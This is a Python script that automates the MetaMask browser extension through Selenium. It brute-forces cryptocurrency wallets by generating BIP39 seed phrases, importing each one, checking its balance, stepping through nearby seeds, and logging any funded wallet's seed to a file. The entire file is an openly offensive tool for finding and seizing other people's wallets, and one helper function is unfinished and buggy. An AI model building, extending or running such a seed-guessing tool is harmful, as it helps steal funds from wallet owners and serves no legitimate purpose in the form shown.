import os, sys, time, secrets, binascii, hashlib
from wordlist import words as wordlist
from selenium import webdriver
from selenium.webdriver.remote import webelement
from selenium.webdriver.remote.webelement import WebElement
from selenium.webdriver.remote.webelement import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from threading import Thread
from datetime import datetime


import logging
logger = logging.getLogger('metamask.log')
logging.basicConfig(filename='metamask.log',
                    format='%(asctime)s %(message)s',
                    level=logging.INFO)
def my_handler(type, value, tb):
    logger.exception(f"Uncaught exception: {type} {value}")


# Install exception handler
sys.excepthook = my_handler

class Metamask(webdriver.Chrome):
    def __init__(self, number):
        self.number = number
        self.pwd = os.path.abspath(os.curdir)
        par = os.path.dirname(os.getcwd())
        options = Options()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_extension(par+r'/metamask_extension_10_3_0_0.crx')
        super(Metamask, self).__init__(options=options)
        self.implicitly_wait(5)
        self.maximize_window()

    def __exit__(self, *args) -> None:
        print("Exiting...")
        self.quit()
        sys.exit()

    def __enter__(self):
        return self

    @staticmethod
    def wordlist_combinator(num_words:int, list_words:list):
        accepted_words = {12:128, 15:160, 18:192, 21:224, 24:256}
        if num_words is not None and num_words not in accepted_words.keys():
            raise ValueError(f"words count did not match required count {accepted_words.keys()}")
        diff = num_words - len(list_words)
        seed = []
        # TODO if last word is inputed...recalculate random for correct checksum
        for word in list_words:
            if word == '':
                rnd = secrets.randbits(11)
                seed.append(wordlist[rnd])
            else:
                if word in wordlist:
                    seed.append(word)
                else:
                    raise ValueError(f'Word: {word} is not in wordlist !')
        # print(seed)
        # fill up the rest od seed
        for idx in range(diff-1):
            rnd = secrets.randbits(11)
            seed.append(wordlist[rnd])
        print(seed)
        ## extract each word position to number ..... wordlist_combinator(12,['','you'])
        seed_int: str = ''
        # TODO Bitshift ??? a=2 (0010) b=3 (0011) c=1 ->> a<<8+b<<4+c = 561
        for word in seed:
            seed_int += bin(wordlist.index(word))[2:].zfill(11)
        # print(f"{int(seed_int, 2)=}")
        # print(f"{seed_int=}")
        # print(f"{len(seed_int)=}")
        print(f"{int(seed_int[:-4],2)=}")
        # print(f"{seed_int=}\n{len(seed_int)=}")   #debug
        ## test of correctness
        regen_seed = []
        # s = bin(seed_int)[2:].zfill(bits)
        for i in range(0,len(seed_int),11):
            regen_seed.append(wordlist[int(seed_int[i:i+11],2)])
        print(f"{regen_seed=}")
        ## entrophy and checksum
        h=int(seed_int, 2).to_bytes(len(seed_int), byteorder='big')
        
        entrophy = binascii.hexlify(h).decode()
        entrophy_sha = binascii.hexlify(hashlib.sha256(h).digest()).decode()
        chsum_len = accepted_words.get(num_words) // 32
        chsum = bin(int(entrophy_sha,16))[2::].zfill(256)
        print(f"{int(chsum,2)=}\n{int(entrophy,16)=}\n{int(entrophy_sha,16)=}")
        print(f"{chsum=}\n{entrophy=}\n{entrophy_sha=}")
        chsum = chsum[:chsum_len]
        seed_int += chsum
        print(f"{int(seed_int,2)=}")
        seed_final = []
        for i in range(0,len(seed_int),11):
            seed_final.append(wordlist[int(seed_int[i:i+11],2)])
        print(f"{seed_final=}")

    @staticmethod
    def gen_wordlist(words: int=15, previous_seed: int=None ):
        """Generate seed according BIP39"""
        # print("\n***Gen-Worldist***")
        accepted_words = {12:128, 15:160, 18:192, 21:224, 24:256}
        if words is not None and words not in accepted_words.keys():
            raise ValueError(f"words count did not match required count {accepted_words.keys()}")
        bits = accepted_words.get(words)
        if not previous_seed:
            start_seed = secrets.randbits(bits)
        else:
            start_seed = previous_seed
        s = bin(start_seed)[2:].zfill(bits)
        # print(f"{s=}")
        h=int(s, 2).to_bytes((len(s) + 7) // 8, byteorder='big')
        entrophy = binascii.hexlify(h).decode()
        entrophy_sha = binascii.hexlify(hashlib.sha256(h).digest()).decode()
        s_ = s
        chsum_len = accepted_words.get(words) // 32
        chsum = bin(int(entrophy_sha,16))[2::].zfill(256)
        chsum = chsum[:chsum_len]
        s_ += chsum
        seed = []
        for x,i in enumerate(range(0,len(s_),11)):
            # print(f"{int(s_[i:i+11],2)} = {k.words[int(s_[i:i+11],2)]}")
            seed.append(wordlist[int(s_[i:i+11],2)])
        # print(f"{s=}\n{chsum=}\n{seed=}\n{entrophy=}\n{start_seed=}\n{len(seed)=}")
        # print(f"{seed=}\n{start_seed=}\n{len(seed)=}\n{s_=}\n{int(s_,2)=}")
        print(f"{seed}")
        return seed, entrophy, start_seed

    def open_page(self):
        self.get('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html')
        # remove unnecessary tabs
        tabs = len(self.window_handles)
        if tabs >=2:
            for idx in range(tabs):
                self.switch_to.window(self.window_handles[-idx])
                self.close()
                self.switch_to.window(self.window_handles[idx])
                if len(self.window_handles) == 1:
                    break
    
    def get_started(self):
        self.find_element(By.CSS_SELECTOR,'button[class="button btn--rounded btn-primary first-time-flow__button"]').click()
        self.find_element(By.CSS_SELECTOR,'button[class="button btn--rounded btn-primary first-time-flow__button"]').click()
        self.find_element(By.CSS_SELECTOR,'button[data-testid="page-container-footer-next"]').click()

    def import_wallet(self):

        WebDriverWait(self,15).until(
            EC.visibility_of_element_located((By.XPATH,'//input'))
            )
        print("Inputs located...")
        # time.sleep(5000)
        self.seed, self.entrophy, self.previous_seed = self.gen_wordlist(12)
        self.expansion = 1
        inputs = self.find_elements(By.XPATH,'//input')
        inputs[0].send_keys(' '.join(self.seed))
        self.find_element(By.CSS_SELECTOR,'.first-time-flow__checkbox').click()
        inputs[1].send_keys('qwertyqwerty')
        inputs[2].send_keys('qwertyqwerty')
        self.find_element(By.CSS_SELECTOR,'.first-time-flow__terms').click()
        self.find_element(By.CSS_SELECTOR,'.first-time-flow__button').click()
        time.sleep(2)
        self.find_element(By.CSS_SELECTOR,'.first-time-flow__button').click()
    
    def get_values(self) -> float:
        WebDriverWait(self,15).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR,'.eth-overview__secondary-balance'))
            )
        balance = self.find_element(
            By.CSS_SELECTOR,'.eth-overview__secondary-balance').find_element(
                By.CSS_SELECTOR,'.currency-display-component__text')
        val = balance.get_attribute('innerHTML')
        print(str(self.number)+' '+val+self.find_element(
            By.CSS_SELECTOR,'.eth-overview__secondary-balance').find_element(
                By.CSS_SELECTOR,'.currency-display-component__suffix').get_attribute('innerHTML'))
        return float(val[1:])

    def lock_wallet(self, restore=False):
        print("Locking...")
        if not restore:
            self.find_element(By.ID,'popover-content')
            self.find_element(By.CSS_SELECTOR,'.popover-header__button').click()
        self.find_element(By.CSS_SELECTOR,'.account-menu__icon').click()
        self.find_element(By.CSS_SELECTOR,'.account-menu__lock-button').click()
        self.find_element(By.CSS_SELECTOR,'.unlock-page__link--import').click()
    
    def restore_wallet(self):
        WebDriverWait(self,15).until(
            EC.visibility_of_element_located((By.XPATH,'//input'))
            )
        self.seed, self.entrophy, self.previous_seed = self.gen_wordlist(12,self.previous_seed+self.expansion)
        if self.expansion < 0:
            self.expansion = abs(self.expansion) +2
            self.expansion = -self.expansion
        self.expansion = -self.expansion-1
        inputs = self.find_elements(By.XPATH,'//input')
        inputs[0].send_keys(' '.join(self.seed))
        inputs[1].send_keys('qwertyqwerty')
        inputs[2].send_keys('qwertyqwerty')

        self.find_element(By.CSS_SELECTOR,'.first-time-flow__button').click()

    def save_wallet(self, found=False):
        with open(self.pwd+r"/wallets.txt", "a") as file1:
        # Writing data to a file
            tim = datetime.now().strftime('%d.%m.%y %H:%M:%S')
            filedata = f"{tim} {self.expansion=} {str(self.value)}  {str(self.seed)} {self.entrophy}"
            if found:
                filedata += '\n'+100*"^"
            file1.write(filedata)
            file1.write("\n")
    
    def _refresh(self):
        print("...Refreshing...")
        # self.refresh()
    
    def start(self):
        def _go():
            self.open_page()
            self.get_started()
            self.import_wallet()
            restore = False
            while True:
                tim = time.time()
                self.value = self.get_values()
                if self.value == 0:
                    self.lock_wallet(restore)
                    self.restore_wallet()
                    restore=True
                else:
                    print("something found !")
                    self.save_wallet(True)
                    sys.exit(0)
        self.thread = Thread(target=_go,)
        self.thread.start()
    
    def _join(self):
        self.thread.join()
 
